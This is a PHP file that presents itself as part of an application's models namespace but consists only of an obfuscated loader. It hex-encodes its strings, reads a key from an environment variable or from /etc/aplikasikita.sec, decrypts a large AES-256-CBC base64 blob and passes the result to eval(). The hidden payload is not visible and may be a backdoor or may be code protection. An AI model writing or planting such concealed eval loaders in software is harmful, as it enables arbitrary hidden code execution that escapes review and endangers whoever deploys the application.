<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('AEt+YpGsomevTEfKJPFXdQ==');

$c=base64_decode(

'LP83IGjFtX6q2zYDK42ERoVLp4A2YOxKyDNQbjEbvk1swQ7MzsCwCK1+10vpdsTTRnyXZDL8rjUX' .
'6G9pYxhNmL802IOyZQiZZ8CwCdqj3qtPSHaYNNa33ZrggZBRYsfJWpQPewnZ5OlTSO7jJhvh4mBm' .
'O2KIsMMEzJ7hQMZQk4Rk1SFW4eEbyQnQQya15hIIssaFhYxymuNLZmco6xGzxTC6pJvNl2yrcoEU' .
'CO1Az8rwaGS3YrhaBWezcbTnMuV8kzMQh/oMYcflIxHlQqD9JlDti5H3DCRrnrQmcSTBaNFF0Q3X' .
'zXjvTrNqQr5SeivZQ2u3YDTcrVHII6RoCabjOIjhgYDpagHq1WLiEyMzgq9xNhUq7p+/ZtfXP86a' .
'GNB72DRdzwoe7izeADfh/WhX8id1Af2t47W/ZjMJdZPDcLasSAffJ3iF8hQz9tp+86kb07vQc/qG' .
'DCbGvKvATBtRL4y11LPj6tqFZBb2nR6vYZZkWun8ZoiszoLZhV5hyHmQFqK8Ycq/BXWOGUc9yMjQ' .
'SnAUGJt/Br/4SN41/d3yxMUWea2NAknelIR4vmBA6+7wMNFGesNvdCDnh+1AgXtIhjaGvfG8m9o+' .
'X8telCk+BySgvfLWIYc52C9mV7NfrBiJ1QlHU9JZcR6UqgEiFvxB50on7OKFyGwYgDrFcHeIcSUS' .
'4npaSlhIFPB3/icEm1rVnq8BpEcS3NVC/DSNOdJOAuG7BBiXJwUxfncVW56ZLLz+tvn4qjAAb+mj' .
'GAoKdH+K2MuPTumYg0TuoSlOY5pv9YG+8WlpIZsSfOUzyoFDnf0LGHQwgYLsTB9McEt4iuEeQjpC' .
'sstpJOubLDzs/tZ7R+URllzKjfCHPg9kXvq2hrVPCyexyiz/PrQufpWitT1KbMGR3zJzIRyZs2rg' .
'QJ3acawfOIImfkyDNZE7tOgJTKIKhbO6YAc8doYTK2MP9d5KVbVK8cYKA1n63WimX5lPdSZYa8y6' .
'JiozvVQhvV58I+C+pXuj+0+PegGaugA8sNiGCY0exK0GlOC3jVWqGMv+MQ6TDjDlmm+UnvVgQKXW' .
'OdGQWpwWvlAiQ1lPjluPf2q+Cw9ZxdL+Aw9QfmoSZ0DtJUidOpU+c5kq88L3epGrEYY4sHfZzFUg' .
'iLc9POKFfdKOsytDIUEUf8WgjvFy2/W0B1FDUGZVZLIj4LtHzr9LWojOYa10t/712d8fXhY6hsKc' .
'kk7nEbw9JGkJV2J2W69GATFlyRxLkucRoASJFkK9HzFS2iTLuk1yAKphRxxn1h6AadiBeCtmk+eh' .
'+G+1a3zr1c0NaM/RtODXI7V4uE0tTpg='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

